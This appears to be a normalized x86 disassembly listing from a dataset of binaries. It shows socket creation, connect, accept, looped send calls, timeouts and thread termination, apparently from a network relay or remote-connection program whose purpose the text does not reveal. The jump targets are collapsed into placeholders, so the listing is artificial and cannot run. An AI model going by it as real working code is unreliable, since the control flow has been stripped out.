mov edx 0x2
mov [ ebp - 0x1b8 ] ecx
mov [ ebp - 0x1fc ] dx
push 0x1
mov ecx 0x7530
lea edx [ ebp - 0x200 ]
mov [ ebp - 0x1bc ] eax
mov [ ebp - 0x1d0 ] 0x2
mov [ ebp - 0x200 ] eax
call sub_4062f0
mov esi eax
add esp 0x4
test esi esi
jle r-xdata
dec eax
mov [ ebx + 0x9c ] eax
cmp eax edx
jne r-xdata
mov [ ebx + 0x98 ] edx
mov eax [ ebx + 0x9c ]
cmp eax edx
je r-xdata
mov [ ebx + 0x80 ] edx
jmp r-xdata
dec eax
mov [ ebx + 0x84 ] eax
cmp eax edx
jne r-xdata
mov edx [ ebp - 0x1bc ]
push 0x0
mov eax 0x4
sub eax edi
push eax
lea ecx [ ebp + edi - 0x1d0 ]
push ecx
push edx
call [ send@IAT ]
mov esi eax
call [ WSAGetLastError@IAT ]
cmp eax 0x2746
je r-xdata
test esi esi
jns r-xdata
push r--data
call sub_40ac45
add esp 0x4
lea ecx [ ebp - 0x1b4 ]
lea eax [ ebx + 0x74 ]
push ecx
call sub_409220
lea ecx [ ebp - 0x1b4 ]
lea edx [ esi + 0x2 ]
lea eax [ ebx + 0x8c ]
push ecx
mov [ ebp - 0x1b4 ] edx
call sub_409220
jmp r-xdata
lea edx [ ebp - 0x1b4 ]
mov eax ebx
mov [ ebp - 0x1b4 ] edi
call sub_4090c0
mov ecx [ ebp - 0x1cc ]
mov eax [ eax ]
mov edx 0x2
mov [ ebp - 0x1b4 ] ecx
mov [ ebp - 0x210 ] dx
push 0x1
mov ecx 0x7d0
lea edx [ ebp - 0x214 ]
mov [ ebp - 0x1c0 ] eax
mov [ ebp - 0x214 ] eax
call sub_4062f0
mov esi eax
add esp 0x4
test esi esi
jle r-xdata
cmp [ ebp - 0x1cc ] 0x1
jle r-xdata
test [ ebp - 0x1fa ] 0x2
je r-xdata
mov [ ebx + 0x98 ] edx
cmp eax 0x2745
je r-xdata
mov [ ebp - 0x1c8 ] 0x0
xor edi edi
lea ebx [ ebx ]
mov edx [ ebp - 0x1d0 ]
mov al [ edx ]
test al al
je r-xdata
cmp esi 0x1
jne r-xdata
mov edi 0xfffffffe
test [ ebp - 0x20e ] 0x2
je r-xdata
mov edx [ ebx + 0xa8 ]
mov ax [ ebp - 0x1c8 ]
mov [ edx + 0xa ] ax
mov [ ebp - 0x1bc ] 0x0
xor edi edi
lea esp [ esp ]
test esi esi
jle r-xdata
jns r-xdata
add edi esi
jmp r-xdata
mov eax [ ebx + 0x10 ]
add edi edi
movzx ecx [ edi + eax - 0x2 ]
lea edx [ ebp - 0x1b4 ]
lea eax [ ebx + 0x40 ]
mov [ ebp - 0x1b4 ] ecx
call sub_4090c0
mov edx [ eax ]
push 0xffffffff
push edx
call [ WaitForSingleObject@IAT ]
mov eax [ ebx + 0x10 ]
movzx ecx [ edi + eax - 0x2 ]
lea edx [ ebp - 0x1b4 ]
lea eax [ ebx + 0x40 ]
mov [ ebp - 0x1b4 ] ecx
call sub_4090c0
mov eax [ eax ]
lea edx [ ebp - 0x218 ]
push edx
push eax
call [ GetExitCodeThread@IAT ]
mov ecx [ ebx + 0x10 ]
movzx edx [ edi + ecx - 0x2 ]
mov [ ebp - 0x1b4 ] edx
lea edx [ ebp - 0x1b4 ]
lea eax [ ebx + 0x40 ]
call sub_4090c0
mov ecx [ ebp - 0x218 ]
mov edx [ eax ]
push ecx
push edx
call [ TerminateThread@IAT ]
mov eax [ ebx + 0x10 ]
movzx ecx [ edi + eax - 0x2 ]
lea edx [ ebp - 0x1b4 ]
lea eax [ ebx + 0x40 ]
mov [ ebp - 0x1b4 ] ecx
call sub_4090c0
mov edx [ eax ]
push edx
call [ CloseHandle@IAT ]
mov eax [ ebx + 0x10 ]
movzx ecx [ edi + eax - 0x2 ]
lea edx [ ebp - 0x1b4 ]
mov eax ebx
mov [ ebp - 0x1b4 ] ecx
call sub_4090c0
mov eax [ eax ]
push eax
call [ closesocket@IAT ]
mov edx [ ebx + 0x10 ]
movzx eax [ edi + edx - 0x2 ]
mov [ ebp - 0x1b4 ] eax
lea edx [ ebp - 0x1b4 ]
mov eax ebx
call sub_4090c0
mov [ eax ] 0x0
mov ecx [ ebx + 0x10 ]
movzx edx [ edi + ecx - 0x2 ]
mov [ ebp - 0x1b4 ] edx
lea eax [ ebx + 0x20 ]
lea edx [ ebp - 0x1b4 ]
call sub_4090c0
mov [ eax ] 0x0
mov eax [ ebx + 0x10 ]
movzx ecx [ edi + eax - 0x2 ]
lea eax [ ebx + 0x30 ]
lea edx [ ebp - 0x1b4 ]
mov [ ebp - 0x1b4 ] ecx
call sub_4090c0
mov [ eax ] 0x0
mov edx [ ebx + 0x10 ]
movzx eax [ edi + edx - 0x2 ]
mov [ ebp - 0x1b4 ] eax
lea eax [ ebx + 0x50 ]
lea edx [ ebp - 0x1b4 ]
call sub_4090c0
mov esi [ eax ]
mov ecx [ esi ]
push ecx
call [ closesocket@IAT ]
mov edx [ esi + 0x4 ]
push edx
call [ closesocket@IAT ]
call sub_408250
mov eax [ ebx + 0x10 ]
add eax edi
add eax 0xfffffffe
push eax
lea edi [ ebp - 0x220 ]
lea esi [ ebx + 0x10 ]
call sub_409040
jmp r-xdata
cmp al 0x1
je r-xdata
xor edi edi
jmp r-xdata
push 0x64
call [ Sleep@IAT ]
cmp [ ebp - 0x1bc ] 0x1f4
jle r-xdata
mov edx [ ebp - 0x1dc ]
mov eax 0x1
mov [ ebp - 0x1e8 ] edx
push eax
mov ecx 0x1388
lea edx [ ebp - 0x1e8 ]
mov [ ebp - 0x204 ] 0x10
mov [ ebp - 0x1c0 ] 0x0
mov [ ebp - 0x1e4 ] ax
call sub_4062f0
add esp 0x4
test eax eax
jle r-xdata
mov edx [ ebp - 0x1bc ]
push 0x0
mov eax 0x4
sub eax edi
push eax
lea ecx [ ebp + edi - 0x1d0 ]
push ecx
push edx
call [ send@IAT ]
mov esi eax
call [ WSAGetLastError@IAT ]
cmp eax 0x2746
je r-xdata
test esi esi
jns r-xdata
cmp edi 0x4
jne r-xdata
add edi esi
jmp r-xdata
mov eax [ ebp - 0x1c8 ]
add eax 0x1e
mov [ ebp - 0x1c8 ] eax
cmp eax 0x7530
jl r-xdata
call [ WSAGetLastError@IAT ]
cmp eax 0x2746
je r-xdata
cmp edi 0x2
jne r-xdata
cmp edi 0x4
jne r-xdata
mov ecx [ ebx + 0xa8 ]
mov esi [ ebp - 0x1c8 ]
mov eax 0x1
add [ ebp - 0x1e0 ] eax
add [ ebp - 0x1bc ] eax
push ecx
push ebx
call sub_4082c0
test eax eax
je r-xdata
jmp r-xdata
lea edx [ ebp - 0x1b4 ]
mov eax ebx
mov [ ebp - 0x1b4 ] edi
call sub_4090c0
cmp [ eax ] 0x0
ja r-xdata
mov [ ebp - 0x1b4 ] edi
mov edi edi
cmp eax 0x2745
je r-xdata
mov [ ebp - 0x1c8 ] 0x0
xor edi edi
lea ebx [ ebx ]
push 0x1e
call [ Sleep@IAT ]
test esi esi
js r-xdata
cmp eax 0x2745
je r-xdata
mov ecx [ ebp - 0x1b8 ]
push 0x0
mov eax 0x2
sub eax edi
push eax
mov eax [ ebp - 0x1bc ]
lea edx [ edi + ecx ]
push edx
push eax
call [ send@IAT ]
mov esi eax
test esi esi
jle r-xdata
jmp r-xdata
mov edx [ ebp - 0x1c0 ]
push 0x0
mov eax 0x4
sub eax edi
push eax
lea ecx [ ebp + edi - 0x1b4 ]
push ecx
push edx
call [ send@IAT ]
mov esi eax
call [ WSAGetLastError@IAT ]
cmp eax 0x2746
je r-xdata
test esi esi
jns r-xdata
lea edi [ ebx + 0x10 ]
lea eax [ ebp - 0x1c8 ]
call sub_408fe0
movzx esi [ ebp - 0x1c8 ]
lea eax [ ebx + 0x30 ]
lea edx [ ebp - 0x1b4 ]
mov [ ebp - 0x1b4 ] esi
call sub_4090c0
mov [ eax ] 0x0
lea edx [ ebp - 0x1b4 ]
mov eax ebx
mov [ ebp - 0x1b4 ] esi
call sub_4090c0
mov ecx [ ebp - 0x1cc ]
mov eax [ eax ]
mov edx 0x2
mov [ ebp - 0x1b4 ] ecx
mov [ ebp - 0x1f4 ] dx
push 0x1
mov ecx 0x7d0
lea edx [ ebp - 0x1f8 ]
mov [ ebp - 0x1c0 ] eax
mov [ ebp - 0x1f8 ] eax
call sub_4062f0
mov esi eax
add esp 0x4
test esi esi
jle r-xdata
push 0xa
call [ Sleep@IAT ]
mov eax [ ebp - 0x1c0 ]
mov ecx eax
inc eax
mov [ ebp - 0x1c0 ] eax
cmp ecx 0x2710
jg r-xdata
test esi esi
jle r-xdata
jns r-xdata
add edi esi
jmp r-xdata
je r-xdata
or edi 0xffffffff
jmp r-xdata
cmp eax 0x2745
je r-xdata
xor edi edi
mov [ ebp - 0x1bc ] 0x0
cmp [ ebp - 0x1cc ] edi
je r-xdata
test [ ebp - 0x1f2 ] 0x2
je r-xdata
mov edx [ ebp - 0x1dc ]
mov eax 0x1
mov [ ebp - 0x1e8 ] edx
push eax
mov ecx 0x1388
lea edx [ ebp - 0x1e8 ]
mov [ ebp - 0x1e4 ] ax
call sub_4062f0
add esp 0x4
test eax eax
jg r-xdata
cmp edi 0x4
jne r-xdata
add edi esi
jmp r-xdata
mov eax [ ebp - 0x1c8 ]
add eax 0x1e
mov [ ebp - 0x1c8 ] eax
cmp eax 0x7530
jl r-xdata
call [ WSAGetLastError@IAT ]
cmp eax 0x2746
je r-xdata
cmp edi 0x2
jne r-xdata
mov ecx [ ebp - 0x1b8 ]
lea edx [ ebp - 0x1b4 ]
lea eax [ ebx + 0x30 ]
mov [ ebp - 0x1b4 ] ecx
call sub_4090c0
mov edx [ ebp - 0x1b8 ]
add [ eax ] edi
mov [ ebp - 0x1b4 ] edx
lea edx [ ebp - 0x1b4 ]
lea eax [ ebx + 0x30 ]
call sub_4090c0
add [ eax ] edi
test esi esi
jle r-xdata
jmp r-xdata
xor edi edi
nop
lea edx [ ebp - 0x1b8 ]
mov eax ebx
mov [ ebp - 0x1b8 ] edi
call sub_4090c0
lea ecx [ ebp - 0x204 ]
push ecx
lea edx [ ebp - 0x20 ]
mov esi eax
mov eax [ ebp - 0x1dc ]
push edx
push eax
call [ accept@IAT ]
mov [ esi ] eax
lea edx [ ebp - 0x1b4 ]
mov eax ebx
call sub_4090c0
cmp [ eax ] 0x0
ja r-xdata
push 0x1e
call [ Sleep@IAT ]
test esi esi
js r-xdata
cmp eax 0x2745
je r-xdata
mov ecx [ ebp - 0x1b8 ]
push 0x0
mov eax 0x2
sub eax edi
push eax
mov eax [ ebp - 0x1bc ]
lea edx [ edi + ecx ]
push edx
push eax
call [ send@IAT ]
mov esi eax
test esi esi
jle r-xdata
jmp r-xdata
add edi esi
jmp r-xdata
mov eax [ ebp - 0x1cc ]
mov ecx [ ebp - 0x1ec ]
push 0x0
sub eax edi
push eax
mov eax [ ebp - 0x1c0 ]
lea edx [ edi + ecx + 0x2 ]
push edx
push eax
call [ send@IAT ]
mov esi eax
test esi esi
jle r-xdata
mov edx [ ebp - 0x1c0 ]
push 0x0
mov eax 0x4
sub eax edi
push eax
lea ecx [ ebp + edi - 0x1b4 ]
push ecx
push edx
call [ send@IAT ]
mov esi eax
call [ WSAGetLastError@IAT ]
cmp eax 0x2746
je r-xdata
test esi esi
jns r-xdata
je r-xdata
jns r-xdata
add edi esi
jmp r-xdata
cmp eax 0x2745
je r-xdata
xor edi edi
mov [ ebp - 0x1bc ] 0x0
cmp [ ebp - 0x1cc ] edi
je r-xdata
mov eax [ ebp - 0x1bc ]
add eax 0x2
mov [ ebp - 0x1bc ] eax
cmp eax 0x7d0
jl r-xdata
call [ WSAGetLastError@IAT ]
cmp eax 0x2746
je r-xdata
cmp edi [ ebp - 0x1cc ]
jne r-xdata
test esi esi
jle r-xdata
jmp r-xdata
push 0x2
call [ Sleep@IAT ]
test esi esi
js r-xdata
cmp eax 0x2745
je r-xdata
jmp r-xdata
cmp edi 0x4
jne r-xdata
add edi esi
jmp r-xdata
mov eax [ ebp - 0x1cc ]
mov ecx [ ebp - 0x1ec ]
push 0x0
sub eax edi
push eax
mov eax [ ebp - 0x1c0 ]
lea edx [ edi + ecx + 0x2 ]
push edx
push eax
call [ send@IAT ]
mov esi eax
test esi esi
jle r-xdata
je r-xdata
jns r-xdata
add edi esi
jmp r-xdata
xor edi edi
jmp r-xdata
mov eax [ ebp - 0x1bc ]
add eax 0x2
mov [ ebp - 0x1bc ] eax
cmp eax 0x7d0
jl r-xdata
call [ WSAGetLastError@IAT ]
cmp eax 0x2746
je r-xdata
cmp edi [ ebp - 0x1cc ]
jne r-xdata
push 0x2
call [ Sleep@IAT ]
test esi esi
js r-xdata
cmp eax 0x2745
je r-xdata
jmp r-xdata
je r-xdata
sub_408250
mov eax [ esi + 0x10 ]
push edi
push eax
call sub_40a0eb
mov edi [ esi + 0xc ]
add esp 0x4
test edi edi
je r-xdata
mov edi [ esi + 0x8 ]
test edi edi
je r-xdata
mov ecx [ edi ]
push ecx
call sub_409fcc
push edi
call sub_40a0eb
add esp 0x8
push esi
call sub_40a0eb
add esp 0x4
mov eax esi
pop edi
retn
mov edx [ edi ]
push edx
call sub_409fcc
push edi
call sub_40a0eb
add esp 0x8
sub_4082c0
push ebp
mov ebp esp
push 0xffffffff
push sub_412bab
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x14
call sub_40a3e1
mov edi eax
add esp 0x4
mov [ ebp - 0x14 ] edi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
cmp edi ebx
je r-xdata
mov edi [ ebp + 0x8 ]
movzx esi si
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ edi + 0x50 ]
lea edx [ ebp + 0xc ]
mov [ ebp + 0xc ] esi
call sub_4090c0
mov [ eax ] ebx
lea edx [ ebp + 0xc ]
lea eax [ edi + 0x40 ]
mov [ ebp + 0xc ] esi
call sub_4090c0
mov [ ebp + 0xc ] eax
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push ebx
push sub_4082a0
push 0x0
push 0x0
call sub_40aba5
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
add esp 0x18
lea edx [ ebp + 0xc ]
lea eax [ edi + 0x40 ]
mov [ ebp + 0xc ] esi
call sub_4090c0
cmp [ eax ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
call sub_407060
mov ebx eax
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop ebx
mov esp ebp
pop ebp
retn 0x8
or eax 0xffffffff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4083a0
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push 0x6
push 0x1
push 0x2
call [ socket@IAT ]
mov ecx [ esi + 0x64 ]
mov [ esi + 0x6c ] eax
mov eax 0x2
push ecx
mov [ ebp - 0x14 ] ax
call [ inet_addr@IAT ]
movzx edx [ esi + 0x68 ]
push edx
mov [ ebp - 0x10 ] eax
call [ htons@IAT ]
cmp [ ebp - 0x10 ] 0xffffffff
mov [ ebp - 0x12 ] ax
je r-xdata
push 0x0
call sub_40a379
int3
movzx eax [ esi + 0x68 ]
test ax ax
je r-xdata
cmp eax 0x10000
jg r-xdata
mov edx [ esi + 0x6c ]
push 0x10
lea ecx [ ebp - 0x14 ]
push ecx
push edx
call [ connect@IAT ]
cmp eax 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ esi + 0x6c ]
xor ecx ebp
call sub_409fbd
mov esp ebp
pop ebp
retn
call [ WSAGetLastError@IAT ]
mov eax [ esi + 0xa8 ]
mov ecx [ eax + 0x10 ]
push ecx
call [ Sleep@IAT ]
mov edx [ esi + 0x6c ]
push edx
call [ closesocket@IAT ]
xor eax eax
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_409fbd
mov esp ebp
pop ebp
retn
sub_408460
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
push r--data
mov esi ecx
call sub_40ac45
mov eax [ esi + 0x6c ]
add esp 0x4
push eax
xor edi edi
call [ closesocket@IAT ]
push 0x6
push 0x1
push 0x2
call [ socket@IAT ]
mov edx [ esi + 0x64 ]
mov ecx 0x2
push edx
mov [ esi + 0x6c ] eax
mov [ ebp - 0x14 ] cx
call [ inet_addr@IAT ]
mov ecx [ esi + 0xa8 ]
mov [ ebp - 0x10 ] eax
mov ax [ esi + 0x70 ]
mov [ ebp - 0x12 ] ax
mov edx [ ecx + 0x10 ]
push edx
call [ Sleep@IAT ]
movzx eax [ ebp - 0x12 ]
push eax
push r--data
call sub_40ac45
mov edx [ esi + 0x6c ]
mov ebx [ connect@IAT ]
add esp 0x8
push 0x10
lea ecx [ ebp - 0x14 ]
push ecx
push edx
call ebx
cmp eax 0xffffffff
jne r-xdata
movzx ecx [ esi + 0x68 ]
push ecx
call [ htons@IAT ]
cmp [ ebp - 0x12 ] ax
jne r-xdata
call [ WSAGetLastError@IAT ]
push eax
push r--data
call sub_40ac45
mov eax [ esi + 0xa8 ]
inc edi
add esp 0x8
cmp edi [ eax + 0xc ]
jge r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
mov al 0x1
pop ebx
call sub_409fbd
mov esp ebp
pop ebp
retn
call sub_4083a0
mov [ esi + 0x6c ] eax
test eax eax
je r-xdata
movzx eax [ esi + 0x68 ]
push eax
call [ htons@IAT ]
mov [ ebp - 0x12 ] ax
mov edx [ eax + 0x10 ]
push edx
call [ Sleep@IAT ]
movzx eax [ ebp - 0x12 ]
push eax
push r--data
call sub_40ac45
mov edx [ esi + 0x6c ]
add esp 0x8
push 0x10
lea ecx [ ebp - 0x14 ]
push ecx
push edx
call ebx
cmp eax 0xffffffff
je r-xdata
push eax
push esi
call sub_407130
test al al
jne r-xdata
jmp r-xdata
mov edx [ esi + 0xa8 ]
mov eax [ edx + 0x10 ]
push eax
call [ Sleep@IAT ]
mov ecx [ esi + 0x6c ]
push ecx
call [ closesocket@IAT ]
jmp r-xdata
sub_4085b0
push ebp
mov ebp esp
sub esp 0x58
mov eax [ ebx + 0x6c ]
push esi
push edi
push eax
call [ closesocket@IAT ]
mov eax [ ebx + 0x10 ]
mov ecx [ ebx + 0x14 ]
xor edi edi
sub ecx eax
sar ecx 0x1
mov [ ebp - 0x4 ] edi
je r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov ecx [ ebx + 0x4 ]
movzx edx [ eax + edi * 2 ]
mov eax [ ecx + 0x4 ]
cmp [ eax + 0x15 ] 0x0
mov [ ebp - 0x8 ] ecx
jne r-xdata
mov eax ecx
cmp ecx [ ebx + 0x4 ]
je r-xdata
lea ebx [ ebx ]
lea edi [ ebp - 0x2c ]
mov esi ebx
mov [ ebp - 0x2c ] edx
mov [ ebp - 0x28 ] 0x0
call sub_409e70
mov edx [ ebp - 0x8 ]
push edx
lea edi [ ebp - 0xc ]
mov ecx ebx
call sub_409a00
mov eax [ ebp - 0xc ]
mov edi [ ebp - 0x4 ]
cmp edx [ ecx + 0xc ]
jge r-xdata
mov [ ebp - 0x8 ] eax
mov eax [ eax ]
mov ecx [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
jmp r-xdata
mov eax ecx
cmp ecx [ ebx + 0x4 ]
je r-xdata
lea esp [ esp ]
mov eax [ eax + 0x10 ]
push eax
call [ closesocket@IAT ]
mov ecx [ ebx + 0x10 ]
movzx edx [ ecx + edi * 2 ]
mov ecx [ ebx + 0x4 ]
mov eax [ ecx + 0x4 ]
cmp [ eax + 0x15 ] 0x0
mov [ ebp - 0x8 ] ecx
jne r-xdata
cmp [ eax + 0xc ] edx
jge r-xdata
cmp [ eax + 0x15 ] 0x0
je r-xdata
lea edi [ ebp - 0x34 ]
mov esi ebx
mov [ ebp - 0x34 ] edx
mov [ ebp - 0x30 ] 0x0
call sub_409e70
mov edx [ ebp - 0x8 ]
push edx
lea edi [ ebp - 0x10 ]
mov ecx ebx
call sub_409a00
mov eax [ ebp - 0x10 ]
mov edi [ ebp - 0x4 ]
cmp edx [ ecx + 0xc ]
jge r-xdata
mov [ ebp - 0x8 ] eax
mov eax [ eax ]
mov ecx [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
jmp r-xdata
lea esi [ ebx + 0x40 ]
mov eax ecx
cmp ecx [ esi + 0x4 ]
je r-xdata
lea esp [ esp ]
mov [ eax + 0x10 ] 0xffffffff
mov eax [ ebx + 0x10 ]
mov ecx [ ebx + 0x44 ]
movzx edx [ eax + edi * 2 ]
mov eax [ ecx + 0x4 ]
cmp [ eax + 0x15 ] 0x0
mov [ ebp - 0x8 ] ecx
jne r-xdata
cmp [ eax + 0xc ] edx
jge r-xdata
cmp [ eax + 0x15 ] 0x0
je r-xdata
lea edi [ ebp - 0x3c ]
mov [ ebp - 0x3c ] edx
mov [ ebp - 0x38 ] 0x0
call sub_409e70
mov ecx [ ebp - 0x8 ]
push ecx
lea edi [ ebp - 0x14 ]
lea ecx [ ebx + 0x40 ]
call sub_409a00
mov eax [ ebp - 0x14 ]
mov edi [ ebp - 0x4 ]
cmp edx [ ecx + 0xc ]
jge r-xdata
mov [ ebp - 0x8 ] eax
mov eax [ eax ]
mov ecx [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
jmp r-xdata
lea esi [ ebx + 0x40 ]
mov eax ecx
cmp ecx [ esi + 0x4 ]
je r-xdata
cmp [ eax + 0xc ] edx
jge r-xdata
mov eax [ eax + 0x10 ]
lea edx [ ebp - 0x1c ]
push edx
push eax
call [ GetExitCodeThread@IAT ]
mov ecx [ ebx + 0x10 ]
movzx edx [ ecx + edi * 2 ]
mov ecx [ ebx + 0x44 ]
mov eax [ ecx + 0x4 ]
cmp [ eax + 0x15 ] 0x0
mov [ ebp - 0x8 ] ecx
jne r-xdata
cmp [ eax + 0xc ] edx
jge r-xdata
cmp [ eax + 0x15 ] 0x0
je r-xdata
lea edi [ ebp - 0x44 ]
mov [ ebp - 0x44 ] edx
mov [ ebp - 0x40 ] 0x0
call sub_409e70
mov edx [ ebp - 0x8 ]
push edx
lea edi [ ebp - 0x18 ]
lea ecx [ ebx + 0x40 ]
call sub_409a00
mov eax [ ebp - 0x18 ]
mov edi [ ebp - 0x4 ]
cmp edx [ ecx + 0xc ]
jge r-xdata
mov [ ebp - 0x8 ] eax
mov eax [ eax ]
mov ecx [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
jmp r-xdata
lea esi [ ebx + 0x40 ]
mov eax ecx
cmp ecx [ esi + 0x4 ]
je r-xdata
cmp [ eax + 0xc ] edx
jge r-xdata
mov ecx [ ebp - 0x1c ]
mov edx [ eax + 0x10 ]
push ecx
push edx
call [ TerminateThread@IAT ]
mov eax [ ebx + 0x10 ]
mov ecx [ ebx + 0x44 ]
movzx edx [ eax + edi * 2 ]
mov eax [ ecx + 0x4 ]
cmp [ eax + 0x15 ] 0x0
mov [ ebp - 0x8 ] ecx
jne r-xdata
cmp [ eax + 0x15 ] 0x0
je r-xdata
lea edi [ ebp - 0x4c ]
mov [ ebp - 0x4c ] edx
mov [ ebp - 0x48 ] 0x0
call sub_409e70
mov ecx [ ebp - 0x8 ]
push ecx
lea edi [ ebp - 0x20 ]
lea ecx [ ebx + 0x40 ]
call sub_409a00
mov eax [ ebp - 0x20 ]
mov edi [ ebp - 0x4 ]
cmp edx [ ecx + 0xc ]
jge r-xdata
mov [ ebp - 0x8 ] eax
mov eax [ eax ]
mov ecx [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
jmp r-xdata
lea esi [ ebx + 0x50 ]
mov eax ecx
cmp ecx [ esi + 0x4 ]
je r-xdata
cmp [ eax + 0xc ] edx
jge r-xdata
mov edx [ eax + 0x10 ]
push edx
call [ CloseHandle@IAT ]
mov eax [ ebx + 0x10 ]
mov ecx [ ebx + 0x54 ]
movzx edx [ eax + edi * 2 ]
mov eax [ ecx + 0x4 ]
cmp [ eax + 0x15 ] 0x0
mov [ ebp - 0x8 ] ecx
jne r-xdata
cmp [ eax + 0x15 ] 0x0
je r-xdata
lea edi [ ebp - 0x54 ]
mov [ ebp - 0x54 ] edx
mov [ ebp - 0x50 ] 0x0
call sub_409e70
mov ecx [ ebp - 0x8 ]
push ecx
lea edi [ ebp - 0x24 ]
lea ecx [ ebx + 0x50 ]
call sub_409a00
mov eax [ ebp - 0x24 ]
mov edi [ ebp - 0x4 ]
cmp edx [ ecx + 0xc ]
jge r-xdata
mov [ ebp - 0x8 ] eax
mov eax [ eax ]
mov ecx [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
jmp r-xdata
mov eax [ esi + 0x8 ]
mov [ ebp - 0x8 ] eax
test eax eax
je r-xdata
mov edx [ eax ]
push edx
call sub_409fcc
mov eax [ ebp - 0x8 ]
add esp 0x4
push eax
call sub_40a0eb
add esp 0x4
mov esi [ eax + 0x10 ]
mov edx [ esi ]
push edx
call [ closesocket@IAT ]
mov eax [ esi + 0x4 ]
push eax
call [ closesocket@IAT ]
mov ecx [ esi + 0x10 ]
push ecx
call sub_40a0eb
mov eax [ esi + 0xc ]
add esp 0x4
mov [ ebp - 0x8 ] eax
test eax eax
je r-xdata
cmp [ eax + 0x15 ] 0x0
je r-xdata
push esi
call sub_40a0eb
mov eax [ ebx + 0x10 ]
mov edx [ ebx + 0x14 ]
lea eax [ eax + edi * 2 ]
lea ecx [ eax + 0x2 ]
sub edx ecx
sar edx 0x1
add esp 0x4
add edx edx
push edx
push ecx
push eax
call sub_40a5a0
add [ ebx + 0x14 ] 0xfffffffe
mov eax [ ebx + 0x10 ]
mov ecx [ ebx + 0x14 ]
sub ecx eax
inc edi
sar ecx 0x1
add esp 0xc
mov [ ebp - 0x4 ] edi
cmp edi ecx
jb r-xdata
mov ecx [ eax ]
push ecx
call sub_409fcc
mov edx [ ebp - 0x8 ]
add esp 0x4
push edx
call sub_40a0eb
add esp 0x4
sub_408920
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x14
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x10 ] eax
push esi
push 0x6
push 0x1
push 0x2
mov esi ecx
call [ socket@IAT ]
mov [ esi ] eax
mov eax 0x2
push r--data
mov [ esp + 0x8 ] ax
call [ inet_addr@IAT ]
mov ecx [ esi + 0x10 ]
mov [ esp + 0x8 ] eax
mov dx [ ecx + 0x8 ]
mov ecx [ esi ]
push 0x10
lea eax [ esp + 0x8 ]
push eax
push ecx
mov [ esp + 0x12 ] dx
call [ connect@IAT ]
cmp eax 0xffffffff
jne r-xdata
mov ecx esi
call sub_408b00
mov [ esi + 0x4 ] eax
cmp eax 0xffffffff
jne r-xdata
mov edx [ esi + 0x10 ]
movzx eax [ edx + 0x8 ]
push eax
call [ WSAGetLastError@IAT ]
push eax
push r--data
call sub_40ac45
add esp 0xc
cmp eax 0xfffffffe
jne r-xdata
push r--data
call sub_40ac45
add esp 0x4
jmp r-xdata
call sub_408d80
push 0x1
mov eax esi
call sub_408a10
push r--data
call sub_40ac45
add esp 0x4
pop esi
mov ecx [ esp + 0x10 ]
xor ecx esp
call sub_409fbd
mov esp ebp
pop ebp
retn
push 0x0
mov eax esi
call sub_408a10
mov ecx [ esp + 0x14 ]
pop esi
xor ecx esp
call sub_409fbd
mov esp ebp
pop ebp
retn
sub_408a10
push ebp
mov ebp esp
sub esp 0x10
push ebx
mov ebx [ eax ]
push esi
mov ecx 0x2
push edi
mov [ ebp - 0x8 ] cx
push 0x1
mov ecx 0x7d0
lea edx [ ebp - 0xc ]
mov [ ebp - 0x10 ] 0x1
mov [ ebp - 0xc ] ebx
call sub_4062f0
mov edi eax
add esp 0x4
test edi edi
jle r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
test [ ebp - 0x6 ] 0x2
je r-xdata
xor esi esi
push 0x0
mov edx 0x4
sub edx esi
push edx
lea eax [ ebp + esi - 0x10 ]
push eax
push ebx
call [ send@IAT ]
mov edi eax
call [ WSAGetLastError@IAT ]
cmp eax 0x2746
je r-xdata
test edi edi
jns r-xdata
cmp eax 0x2745
je r-xdata
mov [ ebp - 0x8 ] 0x0
xor edi edi
test edi edi
jle r-xdata
jns r-xdata
add edi esi
jmp r-xdata
cmp esi 0x4
jne r-xdata
add esi edi
jmp r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x2
mov [ ebp - 0x8 ] eax
cmp eax 0x7d0
jl r-xdata
call [ WSAGetLastError@IAT ]
cmp eax 0x2746
je r-xdata
cmp edi 0x1
jne r-xdata
push 0x2
call [ Sleep@IAT ]
test esi esi
js r-xdata
cmp eax 0x2745
je r-xdata
push 0x0
mov ecx 0x1
sub ecx edi
push ecx
lea edx [ ebp + edi + 0x8 ]
push edx
push ebx
call [ send@IAT ]
mov esi eax
test esi esi
jle r-xdata
je r-xdata
sub_408b00
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx ecx
mov eax [ ebx ]
push esi
mov ecx 0x1
push edi
mov [ ebp - 0x18 ] cx
push ecx
mov ecx 0x4e20
lea edx [ ebp - 0x1c ]
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1c ] eax
call sub_4062f0
add esp 0x4
cmp eax 0x1
jge r-xdata
test eax eax
js r-xdata
